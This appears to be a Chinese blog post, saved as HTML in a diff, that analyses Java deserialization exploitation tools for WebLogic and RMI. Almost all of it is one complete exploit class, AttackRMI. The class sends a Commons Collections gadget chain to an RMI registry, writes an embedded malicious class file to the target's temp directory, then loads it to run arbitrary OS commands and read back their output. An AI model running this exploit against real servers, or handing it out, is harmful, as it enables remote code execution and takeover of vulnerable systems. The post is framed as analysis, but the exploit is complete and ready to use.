@@ -1,0 +1,155 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="Manning23"><title>Java反序列化利用工具原理分析(weblogic,rmi) · Manning23</title><meta name="description" content="综述目前市面上有两款比较好的针对java反序列化漏洞，对weblogic和rmi进行利用的工具，通过对其利用代码分析，理出了这两款工具的编写思路。(工具自行百度寻找)
+反编译jar文件的工具是 Java Decompiler
+分析
+利用java反序列化漏洞把恶意代码写入临时目录。
+利用java反序列"><meta name="keywords"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">Manning23</a></h3><div class="description"><p>Technology &amp; Life</p></div></div></div><ul class="social-links"><li><a href="http://weibo.com/2077484845"><i class="fa fa-weibo"></i></a></li></ul><div class="footer"><a target="_blank" href="/"><span>Theme by </span></a><a href="https://www.caicai.me"> CaiCai </a><span>&</span><a href="https://github.com/Ben02/hexo-theme-Anatole"> Ben</a><div class="by_farbox"><a href="https://hexo.io/zh-cn/" target="_blank">Proudly published with Hexo&#65281;</a></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/about">关于</a></li><li><a href="/archives">归档</a></li></div><div class="information"><div class="back_btn"><li><a onclick="window.history.go(-1)" class="fa fa-chevron-left"> </a></li></div><div class="avatar"><img src="/images/avatar.png"></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>Java反序列化利用工具原理分析(weblogic,rmi)</a></h3></div><div class="post-content"><h2 id="综述"><a href="#综述" class="headerlink" title="综述"></a>综述</h2><p>目前市面上有两款比较好的针对java反序列化漏洞，对weblogic和rmi进行利用的工具，通过对其利用代码分析，理出了这两款工具的编写思路。(工具自行百度寻找)</p>
+<p>反编译jar文件的工具是 <code>Java Decompiler</code></p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul>
+<li>利用java反序列化漏洞把恶意代码写入临时目录。</li>
+<li>利用java反序列化漏洞加载恶意class文件。</li>
+<li>利用反射机制，调用<strong>恶意类及其方法</strong>。</li>
+</ul>
+<p>以上方法实现了本地调用，参考代码。</p>
+<pre><code>import java.io.FileOutputStream;
+import java.io.PrintStream;
+import java.lang.annotation.Target;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.InvocationHandler;
+import java.lang.reflect.Proxy;
+import java.net.URL;
+import java.net.URLClassLoader;
+import java.rmi.Remote;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+import java.util.HashMap;
+import java.util.Map;
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+public class AttackRMI
+{
+  public static Constructor&lt;?&gt; getFirstCtor(String name)
+    throws Exception
+  {
+    Constructor&lt;?&gt; ctor = Class.forName(name).getDeclaredConstructors()[0];
+    ctor.setAccessible(true);
+    return ctor;
+  }
+
+  public static Map Gen_FirstPayload(String OS)
+    throws Exception
+  {
+    String TempFilePath = &quot;c:/windows/temp/ErrorBaseExec.class&quot;;
+    if (OS.equals(&quot;linux&quot;)) {
+      TempFilePath = &quot;/tmp/ErrorBaseExec.class&quot;;
+    }
+    byte[] Classofbyte = { -54, -2, -70, -66, 0, 0, 0, 50, 0, 101, 10, 0, 32, 0, 53, 7, 0, 54, 7, 0, 55, 10, 0, 3, 0, 56, 10, 0, 2, 0, 57, 7, 0, 58, 10, 0, 6, 0, 53, 10, 0, 2, 0, 59, 10, 0, 6, 0, 60, 8, 0, 61, 10, 0, 6, 0, 62, 10, 0, 63, 0, 64, 10, 0, 63, 0, 65, 10, 0, 66, 0, 67, 10, 0, 31, 0, 68, 7, 0, 69, 7, 0, 70, 10, 0, 17, 0, 53, 8, 0, 71, 10, 0, 17, 0, 72, 10, 0, 17, 0, 62, 10, 0, 16, 0, 73, 10, 0, 16, 0, 62, 8, 0, 74, 10, 0, 26, 0, 75, 7, 0, 76, 10, 0, 26, 0, 73, 8, 0, 77, 8, 0, 78, 10, 0, 31, 0, 79, 7, 0, 80, 7, 0, 81, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 9, 114, 101, 97, 100, 66, 121, 116, 101, 115, 1, 0, 41, 40, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 13, 83, 116, 97, 99, 107, 77, 97, 112, 84, 97, 98, 108, 101, 7, 0, 54, 7, 0, 58, 7, 0, 76, 1, 0, 10, 69, 120, 99, 101, 112, 116, 105, 111, 110, 115, 7, 0, 82, 1, 0, 7, 100, 111, 95, 101, 120, 101, 99, 1, 0, 21, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 86, 7, 0, 69, 7, 0, 69, 1, 0, 4, 109, 97, 105, 110, 1, 0, 22, 40, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 86, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 18, 69, 114, 114, 111, 114, 66, 97, 115, 101, 69, 120, 101, 99, 46, 106, 97, 118, 97, 12, 0, 33, 0, 34, 1, 0, 22, 106, 97, 118, 97, 47, 105, 111, 47, 66, 117, 102, 102, 101, 114, 101, 100, 82, 101, 97, 100, 101, 114, 1, 0, 25, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 82, 101, 97, 100, 101, 114, 12, 0, 33, 0, 83, 12, 0, 33, 0, 84, 1, 0, 22, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 66, 117, 102, 102, 101, 114, 12, 0, 85, 0, 86, 12, 0, 87, 0, 88, 1, 0, 1, 10, 12, 0, 89, 0, 86, 7, 0, 90, 12, 0, 91, 0, 92, 12, 0, 93, 0, 94, 7, 0, 95, 12, 0, 96, 0, 97, 12, 0, 37, 0, 38, 1, 0, 19, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 69, 120, 99, 101, 112, 116, 105, 111, 110, 1, 0, 23, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 66, 117, 105, 108, 100, 101, 114, 1, 0, 5, 56, 56, 56, 56, 58, 12, 0, 87, 0, 98, 12, 0, 33, 0, 46, 1, 0, 4, 56, 56, 56, 56, 12, 0, 99, 0, 100, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 1, 0, 2, 13, 10, 1, 0, 10, 99, 109, 100, 32, 47, 99, 32, 100, 105, 114, 12, 0, 45, 0, 46, 1, 0, 13, 69, 114, 114, 111, 114, 66, 97, 115, 101, 69, 120, 101, 99, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 1, 0, 19, 106, 97, 118, 97, 47, 105, 111, 47, 73, 79, 69, 120, 99, 101, 112, 116, 105, 111, 110, 1, 0, 24, 40, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 59, 41, 86, 1, 0, 19, 40, 76, 106, 97, 118, 97, 47, 105, 111, 47, 82, 101, 97, 100, 101, 114, 59, 41, 86, 1, 0, 8, 114, 101, 97, 100, 76, 105, 110, 101, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 6, 97, 112, 112, 101, 110, 100, 1, 0, 44, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 66, 117, 102, 102, 101, 114, 59, 1, 0, 8, 116, 111, 83, 116, 114, 105, 110, 103, 1, 0, 17, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 1, 0, 10, 103, 101, 116, 82, 117, 110, 116, 105, 109, 101, 1, 0, 21, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 82, 117, 110, 116, 105, 109, 101, 59, 1, 0, 4, 101, 120, 101, 99, 1, 0, 39, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 59, 1, 0, 17, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 80, 114, 111, 99, 101, 115, 115, 1, 0, 14, 103, 101, 116, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 1, 0, 23, 40, 41, 76, 106, 97, 118, 97, 47, 105, 111, 47, 73, 110, 112, 117, 116, 83, 116, 114, 101, 97, 109, 59, 1, 0, 45, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 66, 117, 105, 108, 100, 101, 114, 59, 1, 0, 7, 105, 110, 100, 101, 120, 79, 102, 1, 0, 21, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 73, 0, 33, 0, 31, 0, 32, 0, 0, 0, 0, 0, 4, 0, 1, 0, 33, 0, 34, 0, 1, 0, 35, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 1, 0, 36, 0, 0, 0, 6, 0, 1, 0, 0, 0, 3, 0, 9, 0, 37, 0, 38, 0, 2, 0, 35, 0, 0, 0, 123, 0, 5, 0, 5, 0, 0, 0, 56, -69, 0, 2, 89, -69, 0, 3, 89, 42, -73, 0, 4, -73, 0, 5, 76, -69, 0, 6, 89, -73, 0, 7, 77, 43, -74, 0, 8, 89, 78, -58, 0, 17, 44, 45, -74, 0, 9, 18, 10, -74, 0, 9, 87, -89, -1, -20, 44, -74, 0, 11, 58, 4, 25, 4, -80, 0, 0, 0, 2, 0, 36, 0, 0, 0, 26, 0, 6, 0, 0, 0, 6, 0, 16, 0, 7, 0, 24, 0, 9, 0, 33, 0, 10, 0, 47, 0, 13, 0, 53, 0, 14, 0, 39, 0, 0, 0, 17, 0, 2, -3, 0, 24, 7, 0, 40, 7, 0, 41, -4, 0, 22, 7, 0, 42, 0, 43, 0, 0, 0, 4, 0, 1, 0, 44, 0, 9, 0, 45, 0, 46, 0, 2, 0, 35, 0, 0, 0, -81, 0, 6, 0, 3, 0, 0, 0, 101, -72, 0, 12, 42, -74, 0, 13, 76, 43, -74, 0, 14, -72, 0, 15, 77, -69, 0, 16, 89, -69, 0, 17, 89, -73, 0, 18, 18, 19, -74, 0, 20, 44, -74, 0, 20, -74, 0, 21, -73, 0, 22, -65, 76, 43, -74, 0, 23, 18, 24, -74, 0, 25, 2, -92, 0, 5, 43, -65, -69, 0, 16, 89, -69, 0, 17, 89, -73, 0, 18, 18, 19, -74, 0, 20, -69, 0, 26, 89, 43, -74, 0, 23, -73, 0, 27, -74, 0, 20, 18, 28, -74, 0, 20, -74, 0, 21, -73, 0, 22, -65, 0, 1, 0, 0, 0, 43, 0, 43, 0, 16, 0, 2, 0, 36, 0, 0, 0, 30, 0, 7, 0, 0, 0, 19, 0, 8, 0, 20, 0, 16, 0, 21, 0, 43, 0, 24, 0, 44, 0, 26, 0, 57, 0, 28, 0, 59, 0, 31, 0, 39, 0, 0, 0, 12, 0, 2, 107, 7, 0, 47, -4, 0, 15, 7, 0, 48, 0, 43, 0, 0, 0, 4, 0, 1, 0, 16, 0, 9, 0, 49, 0, 50, 0, 2, 0, 35, 0, 0, 0, 34, 0, 1, 0, 1, 0, 0, 0, 6, 18, 29, -72, 0, 30, -79, 0, 0, 0, 1, 0, 36, 0, 0, 0, 10, 0, 2, 0, 0, 0, 38, 0, 5, 0, 39, 0, 43, 0, 0, 0, 4, 0, 1, 0, 16, 0, 1, 0, 51, 0, 0, 0, 2, 0, 52 };
+    Transformer[] transformers = { new ConstantTransformer(FileOutputStream.class), new InvokerTransformer(&quot;getConstructor&quot;, new Class[] { Class[].class }, new Object[] { { String.class } }), new InvokerTransformer(&quot;newInstance&quot;, new Class[] { Object[].class }, new Object[] { { TempFilePath } }), new InvokerTransformer(&quot;write&quot;, new Class[] { byte[].class }, new Object[] { Classofbyte }) };
+    ChainedTransformer transformerChain = new ChainedTransformer(transformers);
+    HashMap innermap = new HashMap();
+    innermap.put(&quot;value&quot;, &quot;value&quot;);
+    Map outmap = TransformedMap.decorate(innermap, (Transformer)null, transformerChain);
+    return outmap;
+  }
+
+  public static Map Gen_SecondPayload(String OS, String cmdd)
+    throws Exception
+  {
+    String ClassPath = &quot;file:/c:/windows/temp/&quot;;
+    if (OS.equals(&quot;linux&quot;)) {
+      ClassPath = &quot;file:/tmp/&quot;;
+    }
+    Transformer[] transformers = { new ConstantTransformer(URLClassLoader.class), new InvokerTransformer(&quot;getConstructor&quot;, new Class[] { Class[].class }, new Object[] { { URL[].class } }), new InvokerTransformer(&quot;newInstance&quot;, new Class[] { Object[].class }, new Object[] { { { new URL(ClassPath) } } }), new InvokerTransformer(&quot;loadClass&quot;, new Class[] { String.class }, new Object[] { &quot;ErrorBaseExec&quot; }), new InvokerTransformer(&quot;getMethod&quot;, new Class[] { String.class, Class[].class }, new Object[] { &quot;do_exec&quot;, { String.class } }), new InvokerTransformer(&quot;invoke&quot;, new Class[] { Object.class, Object[].class }, new Object[] { null, { cmdd } }) };
+
+    Transformer transformedChain = new ChainedTransformer(transformers);
+    Map innerMap = new HashMap();
+    innerMap.put(&quot;value&quot;, &quot;value&quot;);
+    Map outerMap = TransformedMap.decorate(innerMap, null, transformedChain);
+    return outerMap;
+  }
+
+  public static void exeuateFirstRMI(String ip, String port, String os)
+  {
+    String ANN_INV_HANDLER_CLASS = &quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;;
+    String exeuateResult = &quot;&quot;;
+    try
+    {
+      Map outerMap = Gen_FirstPayload(os);
+      Registry registry = LocateRegistry.getRegistry(ip, Integer.parseInt(port));
+      InvocationHandler h = (InvocationHandler)getFirstCtor(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).newInstance(new Object[] { Target.class, outerMap });
+      Remote r = (Remote)Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[] { Remote.class }, h));
+      registry.bind(&quot;pwned&quot;, r);
+    }
+    catch (Exception e)
+    {
+      try
+      {
+        exeuateResult = e.getCause().getCause().getCause().getMessage();
+      }
+      catch (Exception ee)
+      {
+        exeuateResult = &quot;0000&quot;;
+      }
+    }
+  }
+
+  public static String exeuateSecondRMI(String ip, String port, String os, String oscmd)
+  {
+    String ANN_INV_HANDLER_CLASS = &quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;;
+
+    String exeuateResult = &quot;&quot;;
+    try
+    {
+      Map outerMap = Gen_SecondPayload(os, oscmd);
+      Registry registry = LocateRegistry.getRegistry(ip, Integer.parseInt(port));
+      InvocationHandler h = (InvocationHandler)getFirstCtor(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;).newInstance(new Object[] { Target.class, outerMap });
+      Remote r = (Remote)Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[] { Remote.class }, h));
+      registry.bind(&quot;pwned&quot;, r);
+    }
+    catch (Exception e)
+    {
+      try
+      {
+        return e.getCause().getCause().getCause().getMessage();
+      }
+      catch (Exception ee)
+      {
+        exeuateResult = &quot;0000&quot;;
+      }
+    }
+    return exeuateResult;
+  }
+
+  public static void main(String[] args)
+    throws Exception
+  {
+    String ip = &quot;127.0.16.51&quot;;
+    String port = &quot;1099&quot;;
+    String osSystem = &quot;windows&quot;;
+    int success = 0;
+    exeuateFirstRMI(ip, port, osSystem);
+    String temResult = exeuateSecondRMI(ip, port, osSystem, &quot;cmd /c dir d:\\Progra~1\\CMS\\MQ\\bin\\win32&quot;);
+    if (temResult.indexOf(&quot;8888&quot;) &gt; -1)
+    {
+      success = 1;
+    }
+    else if (success == 0)
+    {
+      osSystem = &quot;linux&quot;;
+      exeuateFirstRMI(ip, port, osSystem);
+      temResult = exeuateSecondRMI(ip, port, osSystem, &quot;cat /home/ema/ema-3.4.1/bin/start.sh&quot;);
+      if (temResult.indexOf(&quot;8888&quot;) &gt; -1) {
+        success = 1;
+      }
+    }
+    if (success == 1) {
+      System.out.println(osSystem + &quot; is Success\n&quot; + temResult);
+    } else {
+      System.out.println(&quot;have fail&quot;);
+    }
+  }
+}
+</code></pre></div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2017-06-05</span><i class="fa fa-tag"></i></div></div></div></div><div class="share"><div class="evernote"><a href="javascript:(function(){EN_CLIP_HOST='http://www.evernote.com';try{var%20x=document.createElement('SCRIPT');x.type='text/javascript';x.src=EN_CLIP_HOST+'/public/bookmarkClipper.js?'+(new%20Date().getTime()/100000);document.getElementsByTagName('head')[0].appendChild(x);}catch(e){location.href=EN_CLIP_HOST+'/clip.action?url='+encodeURIComponent(location.href)+'&amp;title='+encodeURIComponent(document.title);}})();" ref="nofollow" target="_blank" class="fa fa-bookmark"></a></div><div class="weibo"><a href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));" class="fa fa-weibo"></a></div><div class="twitter"><a href="http://twitter.com/home?status=,http://yoursite.com/2017/06/05/Java反序列化利用工具原理分析-weblogic-rmi/,Manning23,Java反序列化利用工具原理分析(weblogic,rmi),;" class="fa fa-twitter"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a role="navigation" href="/2017/06/13/Spring-Web-Flow-RCE漏洞分析/" title="Spring Web Flow RCE漏洞分析" class="btn">上一篇</a></li><li class="next pagbuttons"><a role="navigation" href="/2017/05/05/WordPress-4-6版本远程代码执行漏洞/" title="WordPress 4.6版本远程代码执行漏洞" class="btn">下一篇</a></li></ul></div></div></div></div></div><script src="/js/jquery.js"></script><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script></body></html>
